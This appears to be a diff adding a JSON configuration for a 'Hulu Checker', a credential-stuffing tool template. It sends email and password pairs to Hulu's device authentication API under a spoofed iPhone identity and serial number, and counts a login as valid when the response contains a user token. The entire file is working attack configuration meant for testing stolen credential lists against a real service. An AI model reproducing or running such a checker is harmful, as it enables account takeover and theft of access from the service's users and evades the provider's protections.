@@ -1,0 +1,17 @@
+{
+    "config": {
+        "name": "Hulu Checker",
+        "back_name": "Hulu",
+        "author": "I2rys"
+    },
+    "checking": {
+        "invalid_if_contain": "invalid",
+        "retry_if_contain": "",
+        "valid_if_contain": "user_token"
+    },
+    "api_link": "https://auth.hulu.com/v1/device/password/authenticate",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "body": "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=<password>&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<email>"
+}
